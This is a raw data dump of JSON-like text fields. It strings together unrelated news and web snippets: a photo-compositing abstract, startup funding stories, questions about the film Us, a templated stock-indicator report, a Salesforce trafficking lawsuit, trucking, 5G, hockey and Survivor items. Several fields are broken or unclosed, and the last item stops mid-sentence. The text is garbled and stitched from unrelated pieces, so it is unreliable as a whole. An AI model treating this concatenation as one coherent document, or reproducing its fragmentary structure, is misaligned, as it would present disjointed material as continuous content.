      "text": "We present a method for compositing virtual objects into a photograph such that the object colors appear to have been processed by the photo's camera imaging pipeline. Compositing in such a camera-aware manner is essential for high realism, and it requires the color transformation in the photo's pipeline to be inferred, which is challenging due to the inherent one-to-many mapping that exists from a scene to a photo. To address this problem for the case of a single photo taken from an unknown camera, we propose a dual-learning approach in which the reverse color transformation (from the photo to the scene) is jointly estimated. Learning of the reverse transformation is used to facilitate learning of the forward mapping, by enforcing cycle consistency of the two processes. We additionally employ a feature sharing schema to extract evidence from the target photo in the reverse mapping to guide the forward color transformation. Our dual-learning approach achieves object compositing results that surpass those of alternative techniques.",

      "title": "PhotoShelter raises $8 million to store and manage brand assets",
      "text": "PhotoShelter , a New York-based startup developing an asset management platform for marketers, today announced that it\u2019s secured $8 million in funding led by Level Structured Capital, an affiliated fund of Level Equity. It brings the company\u2019s total raised to $12.2 million following a $4.2 million series A round over a decade ago (in April 2007), and CEO Andrew Fingerman says it\u2019ll be used to develop new features, hire on more staff, and finance a 23,000-square-foot headquarters in Manhattan\u2019s Financial District later this year. \nIt\u2019s venture capital well-deserved, the way he tells it. This past year, Libris \u2014 PhotoShelter\u2019s brand-tailored media solution, which launched in 2015 \u2014 saw \u201csignificant\u201d growth and now has over 1,000 customers, including The Associated Press, New York Jets, Los Angeles Chargers, Philadelphia Eagles, Purdue University, National Aquarium, Chick-fil-A, Special Olympics Inc., Pandora, PBS, Politico, and Nathan\u2019s Famous. \n\u201cWe have grown tremendously in our fourteen years as a company and are honored to work with Level Structured Capital. The team at Level understands our vision and wants to help us deliver breakthrough content workflow[s] \u2026 for creative teams, marketers and independent visual storytellers,\u201d he said. \nPhotoShelter, which was founded in 2005 by Allen Murabayashi, Grover Sanschagrin, Jason Burfield, Jeffrey Arnold, Jeffrey Arnold, launched as a cloud-based portfolio site for professional photographers. (It currently hosts hundreds of millions of images across 80,000 accounts.) Its cheapest plan starts at $12 per month (or $10 per month billed annually), and offers nine prebuilt website templates, 4GB of storage, unlimited traffic and file sizes, and an ecommerce component with built-in shopping cart. Pricier tiers add social media site integration, custom domain names, and built-in search engine optimization tools. \nPhotoShelter\u2019s aforementioned Libris product \u2014 which it claims is able to process bulk files up to 70 percent faster than Dropbox, Google Drive, Box, and WordPress from hard drives, servers, camera, and mobile devices \u2014 runs on the company\u2019s owned and operated network of data centers. It supports uploads via a range of methods and mediums, including a drag-and-drop web interface, mobile and desktop clients, file transfer protocol (FTP), third-party apps like Photo Mechanic, and Adobe Creative Cloud apps like Lightroom, InDesign, and Photoshop. And files transferred to Libris (along with their associated EXIF and IPTC metadata) become instantly viewable in a thumbnail-populated dashboard with a built-in media player. \nFiles within Libris can copied and pasted, virtually linked, or organized into an endless number of nested collections and galleries. Libris\u2019 robust permission management system prevents unauthorized people or parties from seeing and downloading assets, and its keyword-based search tool surfaces assets by file type, date range, location, or even orientation. \nOther spotlight features include watermarking, single sign-on, and image rights management. \nFingerman says that in the coming months, PhotoShelter\u2019s content collaboration tools will get a revamp, as will the mobile apps and API. \u201cThis is a crucial moment for the company as we look to build our talented team, relocate our headquarters and expand our offerings in the market,\u201d he said. \u201cWe are excited to get to work.\u201d \n\u201cRight now we\u2019re witnessing an outright explosion in the volume of visual content employed by brands to engage their audiences,\u201d said Level Structured Capital\u2019s Barry Osherow. \u201cThe team at PhotoShelter has built standout expertise in managing visual content at a massive scale, initially serving the community of independent creators and now they\u2019ve built on that heritage to offer a very powerful solution to brands. We\u2019re thrilled to be the financing partner behind the continued expansion of their platform.\u201d \nSign up for Funding Daily \n: Get the latest news in your inbox every weekday.",

      "text": "Some Get Out superfans may be let down by their own stratospheric expectations for Jordan Peele\u2019s follow-up, and it just may not be others\u2019 hypnotic cup of tea, but Us is not a film that invites shrugs. It\u2019s a movie that leaves viewers with more questions than answers\u2013the kind of movie where, love it or hate it, you almost have to go somewhere afterward to chop it up and try to get to the bottom of what just happened. \nThe plot, for the uninitiated\u2013but, good lord, what is anyone uninitiated doing here\u2013involves Adelaide (Lupita Nyong\u2019o) returning as an adult with a family of her own to the beachside city where she once had a chilling encounter with a doppelg\u00e4nger as a child. Just as she feared, the doppelganger finds her and brings along shadow versions of Adelaide\u2019s husband, Gabe (Winston Duke) and their two children, Zora (Shahadi Wright Joseph) and Jason (Evan Alex.) Much like the film\u2019s predecessor, Get Out , what unfolds from this set-up reveals a scope far broader than the initial premise and is packed with pointed pop-culture references and little details that seem designed to stick in viewers\u2019 collective craw. \n\u201cEverything in this movie was deliberate, that is one thing I can guarantee you,\u201d Peele told Mashable over the weekend. \u201cUnless you didn\u2019t like something and that was a complete accident.\u201d \nThe second half of his quote is glib, but the first is dead serious. Peele is a director with both vision and precision, which means that every tiny beat\u2013a throwaway line from Elisabeth Moss, a Black Flag t-shirt\u2013is eligible for intense scrutiny. What does it all mean ? Us is basically a metaphor for class struggle, and how those who ascend out of poverty tend to pull the ladder up behind them, but what else is going on here? Since so many people must be wondering the same thing (enough for a spectacular $70.2M box office take, the best ever for an original horror movie), it\u2019s prime time for poring over Us\u2019s puzzle pieces and trying to put them all together. (One note, though, before going any further. It\u2019s tempting to question the logistics at play in Us , but the answers to questions like, \u201cHow did they get so many jumpsuits and shears?\u201d are covered by lines in the film like, \u201cThat would take a shitload of coordination,\u201d and \u201cIt took years of planning.\u201d These quotes are basically Peele\u2019s way of addressing the audience directly, promising that we\u2019ll have more fun looking elsewhere for answers.) \nAs someone who has now seen the film twice and scoured the netherworld of Reddit looking for answers, here are all the questions I still have about Us . Feel free to tweet at me or Fast Company with your guesses at answers. Spoilers of the utmost spoiler-y caliber will follow. \nVIDEO \nSeveral movies in the entertainment center at the beginning of the movie comment on what we\u2019re about to see\u2013 The Goonies, The Man with Two Brains, C.H.U.D., Nightmare on Elm Street \u2013but what does The Right Stuff imply? \nIs the one glove just a Michael Jackson reference? Or was it inspired by the hand trauma Red recounts when saying that she got \u201csharp objects that sliced through [her] fingers\u201d for Christmas while Adelaide got toys? Or was it inspired by the Tethered woman playing Rock Paper Scissors with her Tethered boyfriend while wearing only one glove? Is it just something that was popular in the \u201980s, a time period Red never got past? Or does one glove simply symbolize an act of untethering? \nWhat was the deal with Jeremiah 11:11? This Slate post offers up what that bible verse is, but does it mean anything, other than the twinning look of \u201c11:11,\u201d a numerical motif throughout the movie? (It\u2019s even there in the score of a baseball game Gabe is watching at one point.) \nWhile we\u2019re looking for hidden significance, there are the shirts. The Thriller one leaves us with much to unpack. Jaws is a nod to beachside horror. But what about Black Flag? Is it a nod to the duality of . . . Henry Rollins? \nWhat is the significance of the rabbits? In addition to being sustenance for the Tethered, they\u2019re a visual motif throughout the movie. Zora is wearing a t-shirt with a rabbit on it\u2013possibly her track and field logo?\u2013and when Adelaide finally goes underground near the end of the film, she gets there through a door with a rabbit on it. Is that an Alice in Wonderland reference? If so, to what end? \nWhy does Red at one point during the home invasion scene cut off a stuffed rabbit\u2019s head with her shears? \nIf the government shut down the cloning experiment that created the Tethered, why did they keep all the Tethered alive? Is it because the Tethered are part of a separate experiment? If so, what could that experiment be? Could it be an attempt to see whether the Tethered would ever organize and try to pull off something like the events of the movie? \nDid Red know the entire time that she and Adelaide switched places? It seems obvious that she did, but she never reveals it while monologuing. That could simply be for the viewer\u2019s benefit, to parcel out the information to us, but it\u2019s possible she just repressed it. \nDid Adelaide know the entire time what she as a child did to Red in order to switch places, or did that just come rushing back to her at the end? Has she been living with this information the whole time and that\u2019s why she says at one point, \u201cI have a hard time, uh, talking\u201d? We only know what her life is like from this one weekend. Is she awkward with everybody because she knows that she\u2019s an impostor pretending, or did she just repress all that? Is this the ultimate example of \u201cforgetting where you came from\u201d? \nWhy did Red not escape as a child? Did she not know she could? By the time she learned that she could and broke her tether through dancing, did she decide instead that it was more important to free the Tethered than to just help herself? \nHow did Red come to know the backstory of the government program to make the Tethered? Does her knowledge of it suggest that her savior status among the Tethered led the government scientists observing the project to fill her in? If so, why? \nDid the Adelaide above the surface start dancing as a child because Red below had already been a dancer before she was brought underground? The line, \u201cTo think, if it wasn\u2019t for you, I would never have started dancing,\u201d could either mean that the switch inspired her to dance, and allowed her to control surface-Adelaide\u2019s dancing, or it could just mean that without your dancing, I wouldn\u2019t have been forced to dance. \nWhat is the deal with the names of the Tethered in the credits? Sure, Adelaide is \u201cRed,\u201d and red is everywhere in this movie, but why is Jodh (Tim Heidecker) Tex, while so many others have Greek names? Are the names of Zora and Jason\u2019s Tethereds\u2013Pluto and Umbrae\u2013tied to any specific Greek Mythology? \nWhat is the significance of Gabe having gone to the historically black university Howard and still wearing a sweater with the school\u2019s imprimatur many years later? What does this say about the theme of upward mobility and lack thereof? \nWhat is the significance of Red\u2019s response to Gabe\u2019s question, \u201cWho are you people?\u201d which is a very smiley \u201cWe are Americans\u201d? Is it merely a \u201cWe\u2019re not so different, you and I\u201d kind of moment? Or is it a nod to first-generation Americans who are constantly asked, \u201cWhere are you from?\u201d \nHands Across America is used to symbolize middle- and upper-class Americans\u2019 stated desire to help those in poverty and their lack of meaningful, lasting follow-through, but is there something about that time period that made the act of HAC particularly hypocritical? \nWhen we see, in flashback, young Adelaide arranging little toy animals in a row as her parents meet with a school counselor, is that a reference to Hands Across America? Does that help guide Red toward her interest in HAC? \nWhen Red is dying at the end, she whistles a tune that is definitely not \u201cItsy Bitsy Spider,\u201d which she and Adelaide both whispered at different points in the movie. What was she whistling, and what does it mean? \nWhy does Red smile so sinisterly when she tells Jason and Pluto, \u201cDon\u2019t burn down our house\u201d? Is she just reiterating the point that they are all connected, with her use of \u2018our,\u2019 or is she saying something more? \nWhat is the significance of Jason digging tunnels at the beach instead of building sandcastles? \nHow come Jason is the only one who figures out he can\u2013or is able to\u2013control his Tethered? \nWhat kind of \u201cmagic trick\u201d is basically just a lighter? Why can Pluto do it right away, when Jason has such a hard time doing it? \nWhat does it mean that the family went to the house the previous year for a grandmother\u2019s funeral, and that Jason had lost his magic trick during that visit? \nWhen Kitty (Elisabeth Moss) almost cuts Adelaide\u2019s face and then cuts her own instead, is it because she recognized Red in Adelaide? Also, she cuts her face right on the spot where she mentioned earlier that she\u2019d gotten plastic surgery, but why? \nAre we to infer that all the dead people on their surface were killed by their Tethereds, or was it just kind of a free-for-all? \nThe cuts on Adelaide\u2019s face at the end of the movie almost form an \u2018x\u2019 and a \u2018?\u2019 Does that mean anything? \nWhen Adelaide assures Jason at the end that \u201ceverything is gonna be like it was before,\u201d how does she know that and to what time period does \u201cbefore\u201d refer? \nWhat does it mean that Jason take a bunny with him back up to the surface?",

      "text": "Stock market reversals can occur at any time. When these corrections happen, the investing world may be quick to make over the top predictions. Looking at the current health of the overall stock market, it is important to remember that market corrections can be quite normal in bull market runs. Investors may use a down day to buy some names they may have had their eye on. As we near the next earnings season, everyone will be checking to see how companies have performed over the previous quarter. Investors and analysts will both be eagerly watching to see if the company can meet and beet projections. \nTrading on volume of 8176, Fortis Inc. (:FTS) has seen a change from the open of 0.04 since the stock opened at 37.2. Monitoring today\u2019s activity, the stock has hit a high point of 37.245 and slipped to a low of 37.16. \nChecking in on the Awesome Oscillator, we see that the reading is 0.67875 for Fortis Inc. (:FTS) . Traders may follow this oscillator to measure market momentum. Created by Bill Williams, the Awesome Oscillator calculates the difference of the 5 period and 34 period SMA. \nThe 20 day Keltner Channels upper envelope is 37.030937. The 20 day Keltner Channels lower envelope is 36.52507. The Keltner Channels indicator was introduced by Chester Keltner in his book How to Make Money in Commodities. Keltner\u2019s ideas have since been expanded upon and are widely used by technical traders. \nDonchian Channels may be useful for technical traders. The primary function of the indicator is to measure volatility. The bands will widen when volatility is high, and they will become narrow with low volatility. The 20 day upper band level is 37.26. For the same period, the lower band level is 36.29. \nShares of Fortis Inc. (:FTS) ended last session at 37.24. Following today\u2019s trade, we note that the stock has moved 0.16137709% since the opening bell. The company has a current market cap of 15953144000. The stock\u2019s high price over the last month is presently 37.26. \nWatching volatility readings, we can see the current value for the stock is 0.64794815. Volatility for the week stands at 1.1472825, and the monthly reading is 1.1362967. Volatility involves the amount of risk in relation to the amount of change in a stock\u2019s value. Tracking the Bull Bear Power, we note that the stock is presently 0.5596896. \nFollowing the Chaikin Money Flow indicator, we note that the current 20 day value is 0.09384241. Traders will watch to see if the indicator can help confirm an ongoing trend. In the midst of a bullish trend, the CMF value staying above zero may point to continuous buying pressure and the possibility of a sustained rise in price. In the midst of a bearish trend, the CMF value staying below zero may show continuous selling pressure and the possibility of continued price decline. \nScanning the equity market, we note that the stock\u2019s current Oscillator Rating is showing \u201cBuy\u201d. Traders will take note of many different factors when examining a stock\u2019s health. Flipping over to the Moving Average Rating, we see that the current sentiment is pointing to a \u201cStrong Buy\u201d. \nWhen certain portfolio stocks are performing poorly, investors may be prone to chase higher return stocks or move into safer stocks. As most investors know, short-term results have the ability to be somewhat misleading. Deviating from a well-crafted plan based on short-term market fluctuations can lead to portfolio trouble in the future. Having the proper mix of stocks in the portfolio may also be beneficial to longer-term performance. Pinpointing overall investment goals and regularly reviewing portfolio positions can help the investor stay on track.",

      "text": "Fifty women who describe themselves as survivors of sex trafficking on the now-defunct Backpage.com web portal accuse Salesforce.com Inc. of profiting off each advertisement. \nThe women sued Salesforce on Tuesday in San Francisco state court, claiming billionaire Marc Benioff\u2019s company knowingly supported Backpage by providing customized database tools to market and remarket prostitutes to \u201cpimps, johns and traffickers who had been underusing its trafficking services.\u201d \n\u201cSalesforce knew the scourge of sex trafficking because it sought publicity for trying to stop it,\" according to the complaint. \u201cBut, at the same time, this publicly traded company was, in actuality, among the vilest of rogue companies, concerned only with [its] bottom line.\" \nSalesforce said it takes the allegations seriously, but declined to comment on the lawsuit. \u201cWe are deeply committed to the ethical and humane use of our products,\" a Salesforce spokeswoman said in a statement. \nThis isn\u2019t the first time that Salesforce has sparked controversy because of its decision to do business with a particular customer. In June, more than 650 Salesforce employees signed a letter asking Benioff to reconsider a contract with U.S. Customs and Border Protection because of the Trump administration\u2019s immigration policies at the time, including one that separated families apprehended crossing the border from Mexico. \nBenioff refused to cancel the deal, arguing that Salesforce\u2019s software wasn\u2019t being used to perpetrate controversial policies. \nThe 50 women who filed Tuesday\u2019s complaint, each identified only as Jane Doe, were sold for sex across the United States, including in the San Francisco Bay area, Cincinnati and Baltimore, according to the complaint. They allege the services provided by Salesforce to Backpage contributed to their being raped and abused. \nStarting in 2013, when Backpage\u2019s growth stalled, Salesforce took on the web portal as a client and provided tools to help manage its \u201ctrafficker and pimp database,\u201d resulting in Backpage\u2019s resurgence, according to the complaint. The lawsuit includes an order form billed to Backpage that\u2019s dated in December 2016. \nSalesforce, led by politically active Benioff, has frequently touted itself as a force for good through its tools and dedication to corporate philanthropy. The company is helping to sponsor an anti-human-trafficking event in April, and its not-for-profit arm spotlighted groups that worked on the front lines of the issue in 2017. \nThe CEO of Backpage pleaded guilty to money laundering and conspiracy charges in three states three days after the site was permanently closed in April 2018. California Attorney General Xavier Becerra announced that Carl Ferrer had agreed to cooperate with prosecutors against a pair of co-conspirators and controlling shareholders.

      "text": "In front of Joachim Horn lay several white blocks small enough to fit in the palm of his hand. He attached an equally small wheel to one of the blocks, and with some taps on a tablet computer, the block became a working motor and the wheel whirred to life. \nIt was a simple demonstration of products sold through his company, SAM Labs , which sells kits to teach hands-on lessons around designing, building and tweaking programs. Horn believes simplicity is a key to making science and technology interesting to not only students, but their teachers. \u201cThere is a misconception that you need to be very technical to teach STEAM,\u201d says the 28-year-old CEO of SAM Labs. \u201cWe want to deliver tools to empower any teacher.\u201d \nThat simplicity has also won over investors, too. The London-based startup has raised $8.9 million in a Series A2 round from Partners in Equity and Inventures Investment Partners. To date, the company has raised $19.8 million. \nFounded in 2014, London-based SAM Labs has grown quite a bit since its first financing\u2014a Kickstarter campaign that brought in about 126,000 pounds (about USD $200,000 at the time). In 2016, the company participated in the second cohort of startups in Intel\u2019s Education Accelerator program. \nToday, the company boasts 41 full-time employees and has sold its builder kits to 4,000 schools worldwide. About 3,000 of those schools are in the U.S., SAM\u2019s largest market. \nA collection of the products that come in a SAM Labs classroom and maker bundle kit. Photo courtesy of SAM Labs. \nSAM charges $1,499 for a STEAM kit that includes curriculum, interface app and wireless blocks for up to 30 students to work on projects. The website also sells individual parts that start at $17 for a charging dock. Horn says the company could be profitable, but has chosen to invest to support its continued growth. \nHorn believes his kits will help prepare students for an ever-advancing workforce by getting them interested in technology at a young age and prompting them to ask questions about how technology works. \u201cEvery single teacher cares about reducing the skills gap,\u201d he says. \u201cWe ask ourselves how we can equip students to be fully empowered for the reality that surrounds them.\u201d \nHe wants to use the new funding to provide more training and resources to help teachers explore the full use of his kits, which allow students to design, write, build and debug programs wirelessly. Students and teachers have built kaleidoscopes, xylophones and motorized bridges. \nA 2016 paper from University of Oslo researchers found that portable maker kits like SAM, littleBits and Printrbot help bring the benefits of maker spaces to those without technological expertise because of the kits\u2019 simplicity and portability. \u201cOur key finding was that a hands on popup maker-space environment engaged participants in collaborative exchanges around an easy to use technological platform led to creative outcomes even though all the participants were completely new to electronic tinkering,\u201d the authors wrote. \nSAM Labs\u2019 Horn says the company has grown in the U.S. thanks to a focus on attending regional professional development events to interact with teachers. Another way the company has grown is through its ability to work with other tools a classroom might use, like Legos and Micro:bit. \nThat compatibility helped sell SAM to Mike Nye, online program coordinator for the Redmond School District in central Oregon. He saw a demonstration of a kit almost two years ago. The kit\u2019s drag and drop interface impressed him while the wireless connection meant easier management and cleanup for teachers, he says. \nHis district is now in its second year of using the kits, and Nye is working toward offering the kits to more students throughout grades three to eight. He estimates the school district has spent about $50,000 for hardware and curriculum for 3,000 students in grades three to eight. The students who have tried the kits have responded positively, he says. \n\u201cSomething about it is inviting enough to get them to keep trying,\u201d he says. \u201cFrom what I\u2019ve seen, it\u2019s been a huge win for us.\u201d",

      "title": "2019: Freight Market Slowdown, Tariffs Diminished Trucking Industry's Performance",
      "text": "[Stay on top of transportation news: Get TTNews in your inbox .] \nIf 2018 was one big party for the trucking and freight business, 2019 was the day after the party. \nA year ago, motor carriers, logistics firms and freight shippers were buoyed by many of the same factors that lifted their customers: U.S. consumers spending big on e-commerce, a lower corporate tax rate, and affordable and abundant fuel. But after last year\u2019s rush to capitalize on that booming market, carriers this year found themselves with an abundance of capacity and fewer loads \u2014 along with a host of other challenges. \nA lengthy trade spat between the United States and China \u2014 which had begun to thaw as 2019 drew to a close \u2014 caused freight to slow during the year, according to Bob Costello, chief economist for American Trucking Associations. Costello also blamed declines in U.S. manufacturing for lower freight volumes in 2019. All of this caused rates to soften \u2014 especially spot rates, Costello said, even as contractual rates remained fairly consistent. \nCostello \nStill, as time wore on, this confluence of factors took a toll on the industry. By Sept. 30, 795 trucking companies had shut down or declared bankruptcy, according to Broughton Capital. That was more than double the 310 in all of 2018, the lowest annual number on record. \nArguably, the highest-profile closure this year was Indianapolis-based Celadon Group , which on Dec. 9 announced it was filing for Chapter 11 bankruptcy and shutting its doors. The closure of Celadon, ranked No. 38 on the Transport Topics Top 100 list of the largest for-hire carriers in North America, came more than two years after an accounting scandal compelled the company to restate years\u2019 worth of financial results and led to indictments against former management. \nThe industrywide downturn did not immediately affect truck sales, however, perhaps because of strong 2018 freight demand. Class 8 retail sales thrived in 2019 even as orders plunged for heavy-duty trucks and trailers. \nU.S. Class 8 retail sales started above replacement levels, about 16,000 per month, as near-record orders placed in 2018 were delivered to customers. As the second half of 2019 arrived, a familiar industry pattern re-emerged \u2014 fleets continued to take on capacity despite slowing freight growth and rising economic uncertainty. Sales soared to an all-time record of 28,258 in September , led by Freightliner\u2019s sales of 11,654. \nMeanwhile, North American Class 8 orders got off to a slow start, with open build slots scarce as factories worked through heavy backlogs. Orders in January plummeted to 15,800 compared with 48,700 a year earlier \u2014 a gap that set the tone for the rest of the year. By July, trade uncertainty and freight jitters sent orders to their lowest level since July 2010. And by autumn, all truck makers and two key suppliers \u2014 Meritor Inc. and SAF Holland \u2014 countered reduced demand by announcing plans to either cut jobs and reduce build rates or flex work hours. By November, Class 8 orders fell to the lowest level, 17,500, for any November since 2015. \nAt the same time, trailer makers entered 2019 on the heels of a record-setting 2018 when 422,351 orders were taken. January\u2019s U.S. net orders of nearly 26,000 marked the third consecutive month the backlog increased to record levels, but supply chain issues remained in play \u2014 slowing deliveries of components and finished trailers. \n\u201cEssentially all production slots are assigned,\u201d Hyundai Translead Chief Sales Officer Stuart James said in March. \nAgainst that backdrop, trailer orders sunk. That changed in October \u2014 the beginning of the traditionally strong fourth quarter \u2014 when orders climbed to 31,900. \nHowever, the engine maker with the largest share of heavy-duty engines, Cummins Inc ., announced in November it would lay off 2,000 salaried employees in the first quarter of 2020, attributing the decision to softening demand in trucking. \nA Cummins X15 engine. (John Sommers II for Transport Topics) \nDespite trucking officials\u2019 and economists\u2019 consistent talk of the softening environment, truck tonnage was slightly higher when compared with 2018\u2019s strong year. ATA said in late November that its tonnage index was up 3.9% year-to-date when measured against the previous year. Except, as noted earlier, for the spot market. \n\u201cThe spot market was growing really strong in 2017 and 2018 and now it\u2019s negative,\u201d Costello said. \u201cWhen you compare it to the last couple of years, it\u2019s off 50%. This is where the freight recession resides, on the truckload side.\u201d \nSigns of trouble could be seen in the fuel markets throughout 2019, as oil did not approach $100 per barrel amid concerns about the weakening global economy and the U.S.-China tariff saga. But this was good for trucking: Diesel, the industry\u2019s main fuel, saw little price fluctuation during the year. On Dec. 10, 2018, diesel cost $3.161 per gallon, according to the U.S. Department of Energy. On Dec. 9, diesel came in at $3.049 per gallon, an 11.2-cent drop in a year. \nStrong U.S. refining capacity kept prices stable, noted Dean Foreman, chief economist for the American Petroleum Institute. This, coupled with record U.S. oil production, kept diesel affordable even as U.S. demand stayed high \u2014 in October, consumption reached about 4.2 million barrels per day. \nHowever, concerns swirled all year about the potential effects of a mandate that large ships begin burning cleaner fuel in 2020. \nThe International Maritime Organization has directed ships to stop using high-sulfur bunker fuel in favor of a lower-sulfur mix drawn from distillates. But as the mandate approached, diesel prices remained undisturbed by this potential new drain on supplies. \n\u201cRight now, the IMO mandate is the dog that has not barked,\u201d said Tom Kloza, global head of energy analysis for the Oil Price Information Service. \u201cBut it has growled a little.\u201d \nKloza \nOil prices did take a short-term jump after a Sept. 14 missile attack on Saudi Arabian oil fields that the Saudis and the U.S. blamed on Iran. While the Department of Energy reported that diesel rose 9.4 cents to $3.081 per gallon Sept. 23, prices quickly fell back down. \n\u201c[2019] was another cheap year for oil,\u201d Kloza said. \u201cIt started in 2015, so this was the fifth cheap year in a row.\u201d \nInexpensive diesel helped shippers maneuver the uncertainty caused by the U.S. tariff war with China as they kept making speculative shipments to fill U.S. warehouses. Costello noted uneven activity from China caused tonnage numbers to become volatile by year\u2019s end. \nThrough 2019, the trade war also kept port officials on edge, even as they spent big to improve their facilities\u2019 ability to handle larger ships. On both the East and West coasts, the nation\u2019s major ports continued investing to increase capacity with deeper shipping channels and larger cranes. \nContainers at the Port of Savannah. (Georgia Ports Authority) \n\u201cThe long term wins the day, and I think that\u2019s why you\u2019re seeing the ports investing in their infrastructure,\u201d said Chris Connor, the new CEO of the American Association of Port Authorities. \nOne of the biggest expansion initiatives is at the Port of Savannah, which plans to double its capacity by the mid-2020s from its current 5.5 million 20-foot-equivalent units per year to more than 11 million TEUs. \nA bright spot for shippers amid the trade war was e-commerce. While consumers\u2019 growing online spending habits boosted demand for final-mile deliveries, some carriers struggled to incorporate the service into their operations. One was Schneider , which had been operating a final-mile unit for three years. The Green Bay, Wis., carrier said Aug. 1 that it would shutter its Schneider Direct segment. \nDespite this, other companies see opportunity in the sector \u2014 especially in specific segments. \n\u201cConsumers are increasingly comfortable buying big and bulky items online,\u201d Daniel Walsh, president of XPO Logistics Inc.\u2019s final-mile business, told TT. \u201cIn the past, there was a tendency to browse, but only buy after an in-store visit and a physical touch. That is changing, and now many more have become comfortable completing the entire transaction virtually.\u201d \nWalsh noted that XPO\u2019s direct-to-consumer business has grown as large national companies use its network of 85 \u201clast-mile hubs\u201d to move products to customers \u2014 including items such as furniture and computers, an indication heavy freight is part of the final-mile family. \nAn XPO spokesman told TT that a survey the company took at the end of 2019 found 71% of consumers said they are likely to buy goods weighing more than 150 pounds online, and 41% indicated they will pay for installation services if needed. \nAnother major player entering the fray is FedEx Freight. In an exclusive interview with TT , CEO John Smith discussed the opportunity his company sees in \u201ccrossing the threshold\u201d into customers\u2019 homes. \n\u201cOver the last 10 years, we\u2019ve all seen the e-commerce business just explode,\u201d he said in October. \u201cIt used to be smaller items they would order online that would be delivered directly to the house. Now, more and more, they\u2019re feeling more comfortable ordering anything that you can order and having it delivered. \n\u201cWe feel like that\u2019s going to continue, and that\u2019s why we feel like we need to get into this business.\u201d \nStaff Reporter Roger Gilroy and Associate News Editor Dan Ronan also contributed to this article. \nWant more news?

      "text": "SEOUL, April 5 (Yonhap) -- Samsung Electronics Co. launched its Galaxy S10 5G in South Korea on Friday, hoping to boost the stagnant smartphone market with the new device designed for the latest mobile network. \nThe nation's three mobile carriers -- SK Telecom Co., KT Corp. and LG Uplus Corp. -- started official registration of Samsung's smartphone. They switched on the 5G network for a select group of customers Wednesday, making South Korea the world's first nation to roll out the commercial 5G service. \nThe 256 gigabyte model costs 1.39 million won (US$1,222), and the 512 GB version is priced at 1.55 million won in the domestic market. \nUsers of the new smartphone, which supports both 4G and 5G networks, will have to pay more for their monthly subscriptions than most of the 4G LTE plans, as all of the telecom companies' data plans start at the mid-50,000 won range and go over 100,000 won for premium services. \nMarket leader SK Telecom is offering an unlimited package for those who subscribe to its 5G service by June, saying it will decide on its pricing strategy based on market reaction in the first three months. \nIts smaller rival KT Corp.'s unlimited 5G data plans are priced over 80,000 won, which come with free international roaming service in South Korea and 185 nations. \nLG Uplus Corp. also offers two plans with unlimited tariffs priced at 85,000 won and 95,000 won, respectively, for those who register for its 5G service by the end of June, joining the cutthroat price competition for the new market. \nIndustry officials expect 5G smartphone users will opt for unlimited plans to enjoy high-quality streaming service, as well as virtual reality (VR) and augmented reality (AR) offered by the carriers. \nFor example, connecting to LG Uplus' celebrity VR dating application for an hour can take about 25-30 GBs, the carrier said. \nTo address concerns over using data-heavy applications, SK Telecom said it will apply a \"zero-rating\" policy to users of its over-the-top content to enable them to enjoy VR and high-quality video content without data deductions from their monthly cap. The company will provide up to 5 GB of free data for users of its mobile and VR games.",

The new company will specialize in sensors and measurement technology with intelligent automation and will marry Rockwell\u2019s expertise in automation and analytics with Schlumberger\u2019s oilfield services experience. With the new offerings, Sensia will enable operators to carry out some operations via automated schedules while also connecting the various pieces of equipment with software so that they can work together while gathering more data from sensors and field devices , to offer insights on how efficiencies can be improved. This could enable operators to improve oil and gas production while cutting down on manual interventions. \nNorth America Will Be The Biggest Market For These Services \nThe North American market will initially be the biggest target of the new JV, with about 41% of the initial revenue mix projected to come from the region. With unconventional resources accounting for a growing mix of the U.S. hydrocarbons production, break-even costs of production are higher, making players more sensitive to oil price volatility. Moreover, there has been a trend of pad drilling \u2013 which is drilling multiple wells from a single piece of land at relatively close proximity \u2013 in the North American market, and this trend could make Rockwell\u2019s control technology more effective for operators in terms of monitoring and maintenance. \nSchlumberger\u2019s Rivals Are Also Focusing On Automation \nThe digital oilfield automation market is expected to grow at a double-digit growth rate , outpacing the broader oilfield services market and Schlumberger\u2019s key rivals have also been focusing on the space. For instance, Halliburton has been doubling down on the market with its Landmark business that offers digital solutions in the oilfield. The company also recently introduced a new automation software for its pressure pumping operations, leveraging algorithms that automatically tune pumps to necessary levels , unlike the typical procedure of having workers ramp up the pumps manually. However, Schlumberger and Rockwell have indicated that they would be the only provider that offers end-to-end solutions in this space. \nWhat\u2019s behind Trefis?

      "text": "Capitals' defenseman Brooks Orpik has 22 goals in 1186 career NHL games across the regular season and playoffs. Goal No. 22 came in overtime against the Hurricanes on Saturday in Game 2 of the Eastern Conference first round to give Washington a 4-3 win and 2-0 lead in the series. The goal makes him the oldest defenseman to score an overtime goal in the postseason. \nUnder two minutes into the overtime period, with the game knotted at three, Evgeny Kuznetsov connected with Orpik on a one-timer from the left faceoff circle. Washington was aided by Carolina defenseman Brett Pesce, who lost his stick on the rush that led to the goal and subsequently stood in front of goaltender Petr Mrazek's as Orpik was shooting. \nBrooks Orpik (38 years, 199 days) is the oldest defenseman in NHL history to score an overtime goal in the #StanleyCup Playoffs. \nHe eclipsed the previous mark set by Minnesota's Keith Carney (38 years, 68 days) in Game 2 of the 2008 Conference Quarterfinals. #NHLStats pic.twitter.com/1EKc7cHg7z \n\u2014 NHL Public Relations (@PR_NHL) April 14, 2019 \nDespite his minimal scoring over his career, Orpik now has two overtime goals in the postseason, an accomplishment he shares with just 10 other defensemen. \nThe series moves to Raleigh for Games 3 and 4 where the Caps will look to complete the second half of a sweep.

      "title": "\u2018Survivor\u2019 Limps to a Finale After a Difficult Season",
      "text": "Ordinarily, the season finale of \u201cSurvivor\u201d is a festive occasion. The contestants gather to reminisce about their time on an island off Fiji, and the winner is announced and awarded $1 million. \nOn Wednesday, it won\u2019t be so simple. \nAs the CBS competition show limped to the end of Season 39, it was still scoring ratings, making an unlikely return to the top 10 as the seventh-most-watched entertainment program on network television. \nBut the announcement of the latest winner caps a season that did not provide the usual escapist thrills. This \u201cSurvivor\u201d offended die-hard fans and some former cast members because of how the show handled female contestants\u2019 complaints of inappropriate touching against a male contestant. \nFor the first time, instead of airing live, the reunion special that is broadcast after the winner is announced was taped hours in advance. And as recently as a few days ago, a \u201cSurvivor\u201d contestant who raised concerns about inappropriate touching, Kellee Kim, was not sure if she would be allowed to speak freely about her experience during the reunion. \nThe backlash over \u201cSurvivor,\u201d which ranks as CBS\u2019s highest-rated entertainment show for adults under 50, took place at a network that has been rocked by a societal reckoning on workplace sexual misconduct. The chief executive , a star anchor and several leading producers at the company have been felled since the start of the #MeToo movement. \nDebra Katz, a 